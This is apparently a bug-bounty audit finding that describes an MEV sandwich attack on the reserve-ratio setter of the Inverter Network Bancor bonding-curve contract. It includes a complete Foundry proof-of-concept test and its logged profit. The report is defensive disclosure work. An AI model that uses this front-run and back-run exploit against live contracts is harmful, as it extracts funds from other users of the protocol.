# [H] FM_BC_Bancor_Redeeming_VirtualSupply_v1.setReserveRatioForSelling vulnerable to MEV

## Summary
Severity: High
Chain: Smart contract
Component: Inverter-Network
Published: 2024-06-15
Source: https://github.com/hats-finance/Inverter-Network-0xe47e52c4fea05e555920f1dcdcc6fb8eca103eeb/issues/131
Type: hats-finding

## Details
**Github username:** --
**Twitter username:** rnemes4
**Submission hash (on-chain):** 0x7c5051743724c53fbbf6588201971e815fe828fa6829ce1e27f0ae2ad4917ba1
**Severity:** high

**Description:**
**Description**\
`FM_BC_Bancor_Redeeming_VirtualSupply_v1.setReserveRatioForSelling` is susceptible to MEV attack if an attacker notices a reduction in the `reserverRatioForSelling` they could front run the transaction using a Flashloan to place a `buy` before the transaction and immediadetly `sell` after the transaction realising a profit in one transaction batch.

**Attack Scenario**\
with an initial setup
```Solidity
IFM_BC_Bancor_Redeeming_VirtualSupply_v1.BondingCurveProperties memory
            bc_properties = IFM_BC_Bancor_Redeeming_VirtualSupply_v1
                .BondingCurveProperties({
                formula: address(formula),
                reserveRatioForBuying: 333_333,
                reserveRatioForSelling: 333_333,
                buyFee: 0,
                sellFee: 0,
                buyIsOpen: true,
                sellIsOpen: true,
                initialIssuanceSupply: 1,
                initialCollateralSupply: 3
            });
```

1. Orchestrator calles `setReserveRatioForSelling` reducing the ratio from `333_333` to `333_133`
2. Bob see this transaction in the mempool and decides to front run with a `buy` for `1_000_000e18` using a flashloan
3. Bob then backrunsthe Orchestrators transaction creating a `sell` for `1_000_000e18`
4. Bob has made a profit of `1000010022715052240014003 - 1000000000000000000000000 = 10022715052240014003` in one transaction

**Attachments**

1. **Proof of Concept (PoC) File**
Add the following test to the E2E test suite which proves the scenario

```Solidity
// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.0;

import "forge-std/console.sol";

// Internal Dependencies
import {
    E2ETest,
    IOrchestratorFactory_v1,
    IOrchestrator_v1
} from "test/e2e/E2ETest.sol";

import {ERC20Issuance_v1} from "@fm/bondingCurve/tokens/ERC20Issuance_v1.sol";

// SuT
import {
    FM_BC_Bancor_Redeeming_VirtualSupply_v1,
    IFM_BC_Bancor_Redeeming_VirtualSupply_v1
} from
    "test/modules/fundingManager/bondingCurve/FM_BC_Bancor_Redeeming_VirtualSupply_v1.t.sol";
import {IBondingCurveBase_v1} from
    "@fm/bondingCurve/interfaces/IBondingCurveBase_v1.sol";

contract BondingCurveFundingManagerE2EMEV2 is E2ETest {
    // Module Configurations for the current E2E test. Should be filled during setUp() call.
    IOrchestratorFactory_v1.ModuleConfig[] moduleConfigurations;

    ERC20Issuance_v1 issuanceToken;

    address alice = address(0xA11CE);
    uint aliceBuyAmount = 200e18;

    address bob = address(0x606);
    uint bobBuyAmount = 1_000_000e18;

    function setUp() public override {
        // Setup common E2E framework
        super.setUp();

        // Set Up individual Modules the E2E test is going to use and store their configurations:
        // NOTE: It's important to store the module configurations in order, since _create_E2E_Orchestrator() will copy from the array.
        // The order should be:
        //      moduleConfigurations[0]  => FundingManager
        //      moduleConfigurations[1]  => Authorizer
        //      moduleConfigurations[2]  => PaymentProcessor
        //      moduleConfigurations[3:] => Additional Logic Modules

        // FundingManager
        setUpBancorVirtualSupplyBondingCurveFundingManager();

        // BancorFormula 'formula' is instantiated in the E2EModuleRegistry

        IBondingCurveBase_v1.IssuanceToken memory issuanceToken_properties =
        IBondingCurveBase_v1.IssuanceToken({
            name: "Bonding Curve Token",
            symbol: "BCT",
            decimals: 18,
            maxSupply: type(uint).max - 1
        });

        address issuanceTokenAdmin = address(this);

        IFM_BC_Bancor_Redeeming_VirtualSupply_v1.BondingCurveProperties memory
            bc_properties = IFM_BC_Bancor_Redeeming_VirtualSupply_v1
                .BondingCurveProperties({
                formula: address(formula),
                reserveRatioForBuying: 333_333,
                reserveRatioForSelling: 333_333,
                buyFee: 0,
                sellFee: 0,
                buyIsOpen: true,
                sellIsOpen: true,
                initialIssuanceSupply: 1,
                initialCollateralSupply: 3
            });

        moduleConfigurations.push(
            IOrchestratorFactory_v1.ModuleConfig(
                bancorVirtualSupplyBondingCurveFundingManagerMetadata,
                abi.encode(
                    issuanceToken_properties,
                    issuanceTokenAdmin,
                    bc_properties,
                    token
                )
            )
        );

        // Authorizer
        setUpRoleAuthorizer();
        moduleConfigurations.push(
            IOrchestratorFactory_v1.ModuleConfig(
                roleAuthorizerMetadata, abi.encode(address(this))
            )
        );

        // PaymentProcessor
        setUpSimplePaymentProcessor();
        moduleConfigurations.push(
            IOrchestratorFactory_v1.ModuleConfig(
                simplePaymentProcessorMetadata, bytes("")
            )
        );

        // Additional Logic Modules
        setUpBountyManager();
        moduleConfigurations.push(
            IOrchestratorFactory_v1.ModuleConfig(
                bountyManagerMetadata, bytes("")
            )
        );
    }

    function test_e2e_OrchestratorFundManagementPOC1() public {
        // address(this) creates a new orchestrator.
        IOrchestratorFactory_v1.WorkflowConfig memory workflowConfig =
        IOrchestratorFactory_v1.WorkflowConfig({
            independentUpdates: false,
            independentUpdateAdmin: address(0)
        });

        IOrchestrator_v1 orchestrator =
            _create_E2E_Orchestrator(workflowConfig, moduleConfigurations);

        FM_BC_Bancor_Redeeming_VirtualSupply_v1 fundingManager =
        FM_BC_Bancor_Redeeming_VirtualSupply_v1(
            address(orchestrator.fundingManager())
        );

        issuanceToken = ERC20Issuance_v1(fundingManager.getIssuanceToken());

        token.mint(alice, aliceBuyAmount);
        token.mint(bob, bobBuyAmount);

        uint buf_minAmountOut =
            fundingManager.calculatePurchaseReturn(aliceBuyAmount); // buffer variable to store the minimum amount out on calls to the buy and sell functions

        vm.startPrank(alice);
        {
            // Approve tokens to orchestrator.
            token.approve(address(fundingManager), aliceBuyAmount);

            // Deposit tokens, i.e. fund the fundingmanager.
            fundingManager.buy(aliceBuyAmount, buf_minAmountOut);

            // After the deposit, alice received some amount of receipt tokens
            // from the fundingmanager.
            assertTrue(issuanceToken.balanceOf(alice) > 0);
        }
        vm.stopPrank();

        buf_minAmountOut = fundingManager.calculatePurchaseReturn(bobBuyAmount);

        uint bobTokenBalanceBefore = token.balanceOf(bob);
        console.log("Bob tokewn balance before: ", token.balanceOf(bob));

        // Bob performs a buy
        vm.startPrank(bob);
        {
            // Approve tokens to fundingmanager.
            token.approve(address(fundingManager), bobBuyAmount);

            // Deposit tokens, i.e. fund the fundingmanager.
            fundingManager.buy(bobBuyAmount, buf_minAmountOut);

            // After the deposit, bob received some amount of receipt tokens
            // from the fundingmanager.
            assertTrue(issuanceToken.balanceOf(bob) > 0);
        }
        vm.stopPrank();

        console.log(
            "token.balanceOf(address(fundingManager))",
            token.balanceOf(address(fundingManager))
        );

        vm.prank(address(this));
        fundingManager.setReserveRatioForSelling(331_333);

        buf_minAmountOut =
            fundingManager.calculateSaleReturn(issuanceToken.balanceOf(bob));

        // Bob Backruns Alice's buy
        vm.startPrank(bob);
        {
            // Approve tokens to fundingmanager.
            issuanceToken.approve(
                address(fundingManager), issuanceToken.balanceOf(bob)
            );

            fundingManager.sell(issuanceToken.balanceOf(bob), buf_minAmountOut);
            assertApproxEqRel(token.balanceOf(bob), bobBuyAmount, 0.00001e18); // ensures that the imprecision introduced by the math stays below 0.001%
        }
        vm.stopPrank();

        uint bobTokenBalanceAfter = token.balanceOf(bob);
        console.log("Bob tokewn balance after: ", token.balanceOf(bob));
        console.log(
            "Bob profit: ", bobTokenBalanceAfter - bobTokenBalanceBefore
        );
    }
}

```

**Output**
```Bash
Logs:
  Bob token balance before:  1000000000000000000000000
  token.balanceOf(address(fundingManager)) 1000200000000000000000000
  Error: a ~= b not satisfied [uint]
          Left: 1000010022715052240014003
         Right: 1000000000000000000000000
   Max % Delta: 0.001000000000000000
       % Delta: 0.001002271505224000
  Bob token balance after:  1000010022715052240014003
  Bob profit:  10022715052240014003

```
2. **Revised Code File (Optional)**
